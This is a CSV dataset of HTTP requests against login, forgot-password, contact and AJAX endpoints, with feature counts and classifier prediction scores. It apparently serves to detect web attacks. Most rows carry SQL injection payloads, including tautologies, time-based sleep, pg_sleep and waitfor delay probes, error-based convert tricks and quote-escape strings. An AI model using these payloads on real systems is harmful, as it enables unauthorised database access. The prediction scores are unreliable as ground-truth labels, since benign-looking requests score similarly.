,method,path,body,single_q,double_q,dashes,braces,spaces,badWords,type,prediction_label,prediction_score
13,GET,/logout'%20AND%202*3*8%3d6*8%20AND%20'1m8Y'%3d'1m8Y,,4,0,0,0,4,0,0,0,1.0
14,POST,/forgotpw,"<forgot><username>e</username></forgot>"" AND 2*3*8=6*8 AND ""H3fx""=""H3fx",0,4,0,0,4,0,0,0,0.84
15,POST,/login,password=-1%20OR%202%2b912-912-1%3d0%2b0%2b0%2b1&username=admin,0,0,0,0,2,0,0,0,0.9016
16,POST,/contact,address=-1%20OR%202%2b694-694-1%3d0%2b0%2b0%2b1&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,0,0,0,0,2,0,0,0,0.9016
17,GET,/logout%22%20AND%202*3*8%3d6*8%20AND%20%22VwGv%22%3d%22VwGv,,0,4,0,0,4,0,0,0,0.84
18,POST,/login,password=-1'%20OR%202%2b517-517-1%3d0%2b0%2b0%2b1%20--%20&username=admin,1,0,1,0,4,0,0,0,1.0
19,POST,/forgotpw,<forgot><username>e</username></forgot>%' AND 2*3*8=6*8 AND 'ZFWn'!='ZFWn%,4,0,0,0,4,0,0,0,1.0
20,POST,/login,password=%bf'%bf%22&username=admin,1,1,0,0,0,0,0,0,1.0
21,POST,/forgotpw,"'""",1,1,0,0,0,0,0,0,1.0
22,POST,/contact,address=-1'%20OR%202%2b795-795-1%3d0%2b0%2b0%2b1%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,1,0,1,0,4,0,0,0,1.0
23,GET,/logout%25'%20AND%202*3*8%3d6*8%20AND%20'wEX7'%21%3d'wEX7%25,,4,0,0,0,4,0,0,0,1.0
24,POST,/forgotpw,"''""""",2,2,0,0,0,0,0,0,1.0
25,POST,/login,password=%f0''%f0%22%22&username=admin,2,2,0,0,0,0,0,0,1.0
26,POST,/login,password=-1'%20OR%202%2b55-55-1%3d0%2b0%2b0%2b1%20or%20'csumCsFn'%3d'&username=admin,4,0,0,0,4,0,0,0,1.0
27,POST,/forgotpw,"if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'""XOR(if(now()=sysdate(),sleep(6),0))OR""*/",2,2,0,14,0,3,0,0,1.0
28,POST,/contact,address=%bf'%bf%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=na,1,1,0,0,0,0,0,0,1.0
29,GET,/%bf'%bf%22,,1,1,0,0,0,0,0,0,1.0
30,POST,/contact,address=-1'%20OR%202%2b516-516-1%3d0%2b0%2b0%2b1%20or%20'BYkreAIR'%3d'&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,4,0,0,0,4,0,0,0,1.0
31,GET,/,,0,0,0,0,0,6,0,0,1.0
32,GET,/if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/,,2,2,0,14,0,3,0,0,1.0
33,POST,/login,password=(select%20convert(int%2cCHAR(65)))&username=admin,0,0,0,3,1,1,0,0,1.0
34,POST,/contact,address=-1%22%20OR%202%2b170-170-1%3d0%2b0%2b0%2b1%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,0,1,1,0,4,0,0,0,1.0
35,POST,/forgotpw,"(select convert(int,CHAR(65)))",0,0,0,3,1,1,0,0,1.0
36,POST,/login,password=-1%22%20OR%202%2b720-720-1%3d0%2b0%2b0%2b1%20--%20&username=admin,0,1,1,0,4,0,0,0,1.0
37,POST,/forgotpw,"(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'""+(select(0)from(select(sleep(6)))v)+""*/",2,2,0,15,0,9,0,0,1.0
38,GET,/%f0''%f0%22%22,,2,2,0,0,0,0,0,0,1.0
39,POST,/contact,address=%f0''%f0%22%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=na,2,2,0,0,0,0,0,0,1.0
40,GET,/,,0,0,0,0,0,18,0,0,1.0
41,GET,/(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/,,2,2,0,15,0,9,0,0,1.0
42,POST,/login,password=g00dPa%24%24w0rD&username=1'%22,1,1,0,0,0,0,0,0,1.0
43,POST,/login,password=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/&username=admin,2,2,0,14,0,3,0,0,1.0
44,POST,/contact,address=(select%20convert(int%2cCHAR(65)))&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=na,0,0,0,3,1,1,0,0,1.0
45,POST,/forgotpw,1 waitfor delay '0:0:9' --,2,0,1,0,5,2,0,0,1.0
46,GET,/,,0,0,0,0,0,4,0,0,1.0
47,GET,/(select%20convert(int%2cCHAR(65))),,0,0,0,3,1,1,0,0,1.0
48,GET,/,,0,0,0,0,0,2,0,0,1.0
49,POST,/contact,address=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,2,2,0,14,0,3,0,0,1.0
50,GET,/1%20waitfor%20delay%20'0:0:9'%20--%20,,2,0,1,0,5,2,0,0,1.0
51,POST,/login,password=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/&username=admin,2,2,0,15,0,9,0,0,1.0
52,POST,/forgotpw,xVIvfJHe'; waitfor delay '0:0:3' --,3,0,1,0,5,2,0,0,1.0
53,GET,/,,0,0,0,0,0,4,0,0,1.0
54,GET,/ajax/popular?offset=1'%22,,1,1,0,0,0,0,0,0,1.0
55,GET,/iK3xYUjU';%20waitfor%20delay%20'0:0:3'%20--%20,,3,0,1,0,5,2,0,0,1.0
56,POST,/forgotpw,QFOjQXuF';select pg_sleep(3); --,1,0,1,1,3,2,0,0,1.0
57,POST,/contact,address=1'%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=service,1,1,0,0,0,0,0,0,1.0
58,POST,/login,password=1%20waitfor%20delay%20'0:0:3'%20--%20&username=admin,2,0,1,0,5,2,0,0,1.0
59,GET,/,,0,0,0,0,0,4,0,0,1.0
60,POST,/forgotpw,ve42wZxt');select pg_sleep(6); --,1,0,1,1,3,2,0,0,1.0
61,POST,/login,password=OmicVsOv';%20waitfor%20delay%20'0:0:6'%20--%20&username=admin,3,0,1,0,5,2,0,0,1.0
62,GET,/,,0,0,0,0,0,4,0,0,1.0
63,POST,/forgotpw,HDruxh0k'));select pg_sleep(6); --,1,0,1,1,3,2,0,0,1.0
64,POST,/login,password=PeIFgUnS';select%20pg_sleep(6);%20--%20&username=admin,1,0,1,1,3,2,0,0,1.0
65,GET,/,,0,0,0,0,0,4,0,0,1.0
66,GET,/ajax/popular?offset=-1%20OR%202%2b784-784-1%3d0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,0,0,1.0
67,GET,/ajax/popular?offset=-1%20OR%202%2b497-497-1%3d0%2b0%2b0%2b1,,0,0,0,0,2,0,0,0,0.9016
68,POST,/login,password=g00dPa%24%24w0rD&username=%bf'%bf%22,1,1,0,0,0,0,0,0,1.0
69,POST,/login,password=stsysrGc');select%20pg_sleep(9);%20--%20&username=admin,1,0,1,1,3,2,0,0,1.0
70,GET,/f69bmkED';select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,0,0,1.0
71,POST,/login,password=g00dPa%24%24w0rD&username=%f0''%f0%22%22,2,2,0,0,0,0,0,0,1.0
72,POST,/login,password=yDkIHdgq'));select%20pg_sleep(9);%20--%20&username=admin,1,0,1,1,3,2,0,0,1.0
73,GET,/ajax/popular?offset=%bf'%bf%22,,1,1,0,0,0,0,0,0,1.0
74,GET,/ajax/popular?offset=-1'%20OR%202%2b525-525-1%3d0%2b0%2b0%2b1%20--%20,,1,0,1,0,4,0,0,0,1.0
75,GET,/35hWy4Eo');select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,0,0,1.0
76,POST,/login,password=g00dPa%24%24w0rD&username=(select%20convert(int%2cCHAR(65))),0,0,0,3,1,1,0,0,1.0
77,POST,/forgotpw,"<forgot><username>(select convert(int,CHAR(65)))</username></forgot>",0,0,0,3,1,1,0,0,1.0
78,GET,/tgj0vtP4'));select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,0,0,1.0
79,GET,/ajax/popular?offset=-1'%20OR%202%2b130-130-1%3d0%2b0%2b0%2b1%20or%20'D0BVA48o'%3d',,4,0,0,0,4,0,0,0,1.0
80,GET,/ajax/popular?offset=%f0''%f0%22%22,,2,2,0,0,0,0,0,0,1.0
81,POST,/contact,address=%bf'%bf%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=service,1,1,0,0,0,0,0,0,1.0
82,POST,/forgotpw,<forgot><username>e&apos; AND 2*3*8=6*8 AND &apos;Wgrf&apos;=&apos;Wgrf</username></forgot>,0,0,0,0,4,0,0,0,1.0
83,POST,/contact,address=%f0''%f0%22%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=service,2,2,0,0,0,0,0,0,1.0
84,GET,/ajax/popular?offset=(select%20convert(int%2cCHAR(65))),,0,0,0,3,1,1,0,0,1.0
85,GET,/ajax/popular?offset=-1%22%20OR%202%2b510-510-1%3d0%2b0%2b0%2b1%20--%20,,0,1,1,0,4,0,0,0,1.0
86,GET,/ajax/latest?offset=-1%20OR%202%2b69-69-1%3d0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,0,0,1.0
87,GET,/ajax/latest?offset=1'%22,,1,1,0,0,0,0,0,0,1.0
88,POST,/forgotpw,<forgot><username>e&quot; AND 2*3*8=6*8 AND &quot;GL14&quot;=&quot;GL14</username></forgot>,0,0,0,0,4,0,0,0,1.0
89,POST,/contact,address=(select%20convert(int%2cCHAR(65)))&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=service,0,0,0,3,1,1,0,0,1.0
90,GET,/ajax/popular?offset=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/,,2,2,0,14,0,3,0,0,1.0
91,GET,/ajax/latest?offset=-1%20OR%202%2b476-476-1%3d0%2b0%2b0%2b1,,0,0,0,0,2,0,0,0,0.9016
92,POST,/forgotpw,<forgot><username>e%&apos; AND 2*3*8=6*8 AND &apos;3SSj&apos;!=&apos;3SSj%</username></forgot>,0,0,0,0,4,0,0,0,1.0
93,GET,/ajax/latest?offset=-1'%20OR%202%2b223-223-1%3d0%2b0%2b0%2b1%20--%20,,1,0,1,0,4,0,0,0,1.0
94,GET,/ajax/popular?offset=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/,,2,2,0,15,0,9,0,0,1.0
95,POST,/login,password=g00dPa%24%24w0rD&username=-1%20OR%202%2b995-995-1%3d0%2b0%2b0%2b1%20--%20,0,0,1,0,4,0,0,0,1.0
96,GET,/ajax/popular?offset=-1;%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,0,0,1.0
97,POST,/login,password=g00dPa%24%24w0rD&username=-1%20OR%202%2b753-753-1%3d0%2b0%2b0%2b1,0,0,0,0,2,0,0,0,0.9016
98,POST,/contact,address=1'%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=suggestions,1,1,0,0,0,0,0,0,1.0
99,POST,/forgotpw,"<forgot><username>if(now()=sysdate(),sleep(3),0)/*&apos;XOR(if(now()=sysdate(),sleep(3),0))OR&apos;&quot;XOR(if(now()=sysdate(),sleep(3),0))OR&quot;*/</username></forgot>",0,0,0,14,0,3,0,0,1.0
100,GET,/ajax/latest?offset=-1'%20OR%202%2b187-187-1%3d0%2b0%2b0%2b1%20or%20'cn5EHTFx'%3d',,4,0,0,0,4,0,0,0,1.0
101,GET,/ajax/popular?offset=-1);%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,0,0,1.0
102,GET,/ajax/popular?offset=1%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,0,0,1.0
103,POST,/forgotpw,<forgot><username>(select(0)from(select(sleep(6)))v)/*&apos;+(select(0)from(select(sleep(6)))v)+&apos;&quot;+(select(0)from(select(sleep(6)))v)+&quot;*/</username></forgot>,0,0,0,15,0,9,0,0,1.0
104,POST,/login,password=g00dPa%24%24w0rD&username=-1'%20OR%202%2b769-769-1%3d0%2b0%2b0%2b1%20--%20,1,0,1,0,4,0,0,0,1.0
105,GET,/ajax/popular?offset=OqRQapeB';%20waitfor%20delay%20'0:0:3'%20--%20,,3,0,1,0,5,2,0,0,1.0
106,GET,/ajax/latest?offset=-1%22%20OR%202%2b177-177-1%3d0%2b0%2b0%2b1%20--%20,,0,1,1,0,4,0,0,0,1.0
107,POST,/forgotpw,<forgot><username>1 waitfor delay &apos;0:0:6&apos; -- </username></forgot>,0,0,1,0,5,2,0,0,1.0
108,GET,/ajax/latest?offset=%bf'%bf%22,,1,1,0,0,0,0,0,0,1.0
109,GET,/ajax/latest?offset=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/,,2,2,0,14,0,3,0,0,1.0
110,GET,/ajax/popular?offset=-1;select%20pg_sleep(6);%20--%20,,0,0,1,1,3,2,0,0,1.0
111,POST,/login,password=g00dPa%24%24w0rD&username=-1'%20OR%202%2b694-694-1%3d0%2b0%2b0%2b1%20or%20'xnqRWndW'%3d',4,0,0,0,4,0,0,0,1.0
112,POST,/forgotpw,<forgot><username>Ziin6e3N&apos;; waitfor delay &apos;0:0:9&apos; -- </username></forgot>,0,0,1,0,5,2,0,0,1.0
113,POST,/login,password=g00dPa%24%24w0rD&username=-1%22%20OR%202%2b174-174-1%3d0%2b0%2b0%2b1%20--%20,0,1,1,0,4,0,0,0,1.0
114,GET,/ajax/latest?offset=%f0''%f0%22%22,,2,2,0,0,0,0,0,0,1.0
115,GET,/ajax/latest?offset=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/,,2,2,0,15,0,9,0,0,1.0
116,GET,/ajax/popular?offset=-1);select%20pg_sleep(6);%20--%20,,0,0,1,1,3,2,0,0,1.0
117,POST,/forgotpw,<forgot><username>rjDzQonD&apos;;select pg_sleep(9); -- </username></forgot>,0,0,1,1,3,2,0,0,1.0
118,POST,/login,password=g00dPa%24%24w0rD&username=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/,2,2,0,14,0,3,0,0,1.0
119,GET,/ajax/latest?offset=-1;%20waitfor%20delay%20'0:0:9'%20--%20,,2,0,1,0,5,2,0,0,1.0
120,GET,/ajax/latest?offset=(select%20convert(int%2cCHAR(65))),,0,0,0,3,1,1,0,0,1.0
121,GET,/ajax/popular?offset=-1));select%20pg_sleep(9);%20--%20,,0,0,1,1,3,2,0,0,1.0
122,GET,/,,0,0,0,0,0,6,0,0,1.0
123,POST,/forgotpw,<forgot><username>2pckmZ9J&apos;);select pg_sleep(3); -- </username></forgot>,0,0,1,1,3,2,0,0,1.0
124,POST,/contact,address=%bf'%bf%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=suggestions,1,1,0,0,0,0,0,0,1.0
125,POST,/login,password=g00dPa%24%24w0rD&username=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/,2,2,0,15,0,9,0,0,1.0
126,GET,/ajax/latest?offset=-1);%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,0,0,1.0
127,GET,/ajax/popular?offset=65Namo09';select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,0,0,1.0
128,GET,/,,0,0,0,0,0,2,0,0,1.0
129,GET,/,,0,0,0,0,0,18,0,0,1.0
130,POST,/contact,address=%f0''%f0%22%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=suggestions,2,2,0,0,0,0,0,0,1.0
131,POST,/forgotpw,<forgot><username>1r9H1dkb&apos;));select pg_sleep(6); -- </username></forgot>,0,0,1,1,3,2,0,0,1.0
132,GET,/ajax/latest?offset=1%20waitfor%20delay%20'0:0:6'%20--%20,,2,0,1,0,5,2,0,0,1.0
133,GET,/,,0,0,0,0,0,4,0,0,1.0
134,GET,/ajax/popular?offset=HudRPBiF');select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,0,0,1.0
135,POST,/login,password=g00dPa%24%24w0rD&username=1%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,5,2,0,0,1.0
136,GET,/,,0,0,0,0,0,6,0,0,1.0
137,GET,/ajax/popular?offset=u41i0KZL'));select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,0,0,1.0
138,POST,/contact,address=(select%20convert(int%2cCHAR(65)))&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=suggestions,0,0,0,3,1,1,0,0,1.0
139,POST,/login,password=g00dPa%24%24w0rD&username=FEXbhJxl';%20waitfor%20delay%20'0:0:9'%20--%20,3,0,1,0,5,2,0,0,1.0
140,GET,/ajax/latest?offset=GqFKZRHw';%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,0,0,1.0
141,GET,/,,0,0,0,0,0,18,0,0,1.0
142,GET,/,,0,0,0,0,0,4,0,0,1.0
143,GET,/ajax/latest?offset=-1;select%20pg_sleep(9);%20--%20,,0,0,1,1,3,2,0,0,1.0
144,POST,/login,password=g00dPa%24%24w0rD&username=ZC5FGeqS';select%20pg_sleep(3);%20--%20,1,0,1,1,3,2,0,0,1.0
145,GET,/,,0,0,0,0,0,4,0,0,1.0
146,GET,/,,0,0,0,0,0,4,0,0,1.0
147,POST,/contact,address=1'%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=product,1,1,0,0,0,0,0,0,1.0
148,POST,/login,password=g00dPa%24%24w0rD&username=jJgpoF9r');select%20pg_sleep(3);%20--%20,1,0,1,1,3,2,0,0,1.0
149,GET,/,,0,0,0,0,0,4,0,0,1.0
150,GET,/,,0,0,0,0,0,4,0,0,1.0
151,GET,/ajax/latest?offset=-1);select%20pg_sleep(3);%20--%20,,0,0,1,1,3,2,0,0,1.0
152,POST,/login,password=g00dPa%24%24w0rD&username=sjaT3DY3'));select%20pg_sleep(6);%20--%20,1,0,1,1,3,2,0,0,1.0
153,GET,/,,0,0,0,0,0,4,0,0,1.0
154,GET,/ajax/latest?offset=-1));select%20pg_sleep(6);%20--%20,,0,0,1,1,3,2,0,0,1.0
155,GET,/,,0,0,0,0,0,4,0,0,1.0
156,GET,/,,0,0,0,0,0,4,0,0,1.0
157,GET,/ajax/latest?offset=lxp2nS87';select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,0,0,1.0
158,GET,/,,0,0,0,0,0,4,0,0,1.0
159,GET,/,,0,0,0,0,0,4,0,0,1.0
160,GET,/ajax/latest?offset=ThLbVli4');select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,0,0,1.0
161,GET,/,,0,0,0,0,0,4,0,0,1.0
162,GET,/,,0,0,0,0,0,2,0,0,1.0
163,GET,/,,0,0,0,0,0,4,0,0,1.0
164,GET,/ajax/latest?offset=tRCZcJsI'));select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,0,0,1.0
165,GET,/,,0,0,0,0,0,4,0,0,1.0
166,POST,/contact,address=%bf'%bf%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=product,1,1,0,0,0,0,0,0,1.0
167,GET,/,,0,0,0,0,0,4,0,0,1.0
168,GET,/,,0,0,0,0,0,4,0,0,1.0
169,GET,/login,,0,0,0,0,0,6,0,0,1.0
170,POST,/contact,address=%f0''%f0%22%22&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=product,2,2,0,0,0,0,0,0,1.0
171,GET,/,,0,0,0,0,0,4,0,0,1.0
172,GET,/,,0,0,0,0,0,4,0,0,1.0
173,GET,/login,,0,0,0,0,0,2,0,0,1.0
174,GET,/login,,0,0,0,0,0,18,0,0,1.0
175,POST,/contact,address=(select%20convert(int%2cCHAR(65)))&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=product,0,0,0,3,1,1,0,0,1.0
176,GET,/,,0,0,0,0,0,4,0,0,1.0
177,GET,/login,,0,0,0,0,0,6,0,0,1.0
178,GET,/login,,0,0,0,0,0,4,0,0,1.0
179,GET,/login,,0,0,0,0,0,18,0,0,1.0
180,GET,/,,0,0,0,0,0,4,0,0,1.0
181,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=na,0,0,0,0,2,0,0,0,0.9016
182,GET,/login,,0,0,0,0,0,4,0,0,1.0
183,GET,/login,,0,0,0,0,0,4,0,0,1.0
184,GET,/login,,0,0,0,0,0,4,0,0,1.0
185,POST,/contact,address=3137%20Laguna%20Street&firstName=1'%22&lastName=kklotbxs&message=20&subject=na,1,1,0,0,2,0,0,0,1.0
186,POST,/contact,address=3137%20Laguna%20Street&firstName=%5c&lastName=kklotbxs&message=20&subject=na,0,0,0,0,2,0,0,0,0.9016
187,GET,/login,,0,0,0,0,0,4,0,0,1.0
188,POST,/contact,address=3137%20Laguna%20Street&firstName=1%00%c0%a7%c0%a2&lastName=kklotbxs&message=20&subject=na,0,0,0,0,2,0,0,0,0.9016
189,GET,/login,,0,0,0,0,0,4,0,0,1.0
190,POST,/contact,address=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,2,2,0,14,0,3,0,0,1.0
191,GET,/login,,0,0,0,0,0,2,0,0,1.0
192,GET,/login,,0,0,0,0,0,4,0,0,1.0
193,POST,/contact,address=3137%20Laguna%20Street&firstName=%40%40p4a2k&lastName=kklotbxs&message=20&subject=na,0,0,0,0,2,0,0,0,0.9016
194,GET,/login,,0,0,0,0,0,4,0,0,1.0
195,POST,/contact,address=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,2,2,0,15,0,9,0,0,1.0
196,GET,/login,,0,0,0,0,0,4,0,0,1.0
197,POST,/contact,address=3137%20Laguna%20Street&firstName=JyI%3d&lastName=kklotbxs&message=20&subject=na,0,0,0,0,2,0,0,0,0.9016
198,GET,/login,,0,0,0,0,0,4,0,0,1.0
199,POST,/contact,address=1%20waitfor%20delay%20'0:0:3'%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,2,0,1,0,5,2,0,0,1.0
200,GET,/login,,0,0,0,0,0,4,0,0,1.0
201,POST,/contact,address=3137%20Laguna%20Street&firstName=%bf'%bf%22&lastName=kklotbxs&message=20&subject=na,1,1,0,0,2,0,0,0,1.0
202,GET,/login,,0,0,0,0,0,4,0,0,1.0
203,POST,/contact,address=57rEghOW';%20waitfor%20delay%20'0:0:6'%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,3,0,1,0,5,2,0,0,1.0
204,GET,/,,0,0,0,0,0,2,0,0,1.0
205,GET,/static/,,0,0,0,0,0,6,0,0,1.0
206,GET,/login,,0,0,0,0,0,4,0,0,1.0
207,POST,/contact,address=3137%20Laguna%20Street&firstName=%f0''%f0%22%22&lastName=kklotbxs&message=20&subject=na,2,2,0,0,2,0,0,0,1.0
208,GET,/login,,0,0,0,0,0,4,0,0,1.0
209,POST,/contact,address=CbkfyfZ0';select%20pg_sleep(6);%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,1,0,1,1,3,2,0,0,1.0
210,GET,/login,,0,0,0,0,0,4,0,0,1.0
211,GET,/static/,,0,0,0,0,0,18,0,0,1.0
212,POST,/contact,address=3137%20Laguna%20Street&firstName=(select%20convert(int%2cCHAR(65)))&lastName=kklotbxs&message=20&subject=na,0,0,0,3,3,1,0,0,1.0
213,GET,/login,,0,0,0,0,0,4,0,0,1.0
214,POST,/contact,address=J1PNVhN7');select%20pg_sleep(9);%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,1,0,1,1,3,2,0,0,1.0
215,GET,/static/img/,,0,0,0,0,0,6,0,0,1.0
216,GET,/static/,,0,0,0,0,0,4,0,0,1.0
217,GET,/login,,0,0,0,0,0,4,0,0,1.0
218,GET,/static/,,0,0,0,0,0,2,0,0,1.0
219,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=service,0,0,0,0,2,0,0,0,0.9016
220,POST,/contact,address=m3DAk5Dj'));select%20pg_sleep(3);%20--%20&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=na,1,0,1,1,3,2,0,0,1.0
221,GET,/static/img/,,0,0,0,0,0,18,0,0,1.0
222,GET,/login,,0,0,0,0,0,4,0,0,1.0
223,GET,/static/,,0,0,0,0,0,4,0,0,1.0
